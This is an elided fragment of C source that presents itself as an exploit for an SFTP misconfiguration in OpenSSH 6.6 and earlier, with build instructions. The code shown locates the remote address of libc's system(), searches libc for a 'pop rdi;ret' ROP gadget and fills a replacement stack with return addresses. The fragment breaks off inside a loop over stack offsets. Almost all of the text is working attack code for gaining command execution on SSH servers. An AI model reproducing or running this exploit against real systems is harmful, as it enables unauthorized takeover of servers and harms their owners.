/*
OpenSSH <=6.6 SFTP misconfiguration exploit
...
Build:
    gcc sshsploit32.c -o sshsploit32 -m32 -std=c99 -lssh
Usage:
...
int main(int argc, char **argv) {
  ...
  long start_addr, end_addr, offset;
  char *libc_path = NULL;
  long stack_start_addr = 0, stack_end_addr;
  ...
  long remote_system_addr = start_addr+system_offset-offset;
  printf("remote system() function is at %lx\n", remote_system_addr);

  printf("looking for ROP gadget `pop rdi;ret` (0x5fc3) in libc... (using just ret for 32bit)\n");
  char *gadget = memmem(libc+offset, end_addr-start_addr, "\x5f\xc3", 2);
  if (gadget == NULL) fprintf(stderr, "no gadget found :(\n"), exit(1);
  long gadget_address = start_addr + (gadget-(libc+offset));
  long ret_address = gadget_address+1;
  ...
  long stack_len = stack_end_addr - stack_start_addr;
  /*if (stack_len > 32000) {
    stack_len = 32000;
  ...
  for (long *s = (void*)new_stack; s<(long*)(new_stack+stack_len); s++) {
    *s = ret_address;
  }
  ...
  long *se = (void*)(new_stack + stack_len);
  /*
  se[-3] = gadget_address;
  ...
  */
  ...
  for (long off = stack_len-32000; off >= 0; off -= 32000) {
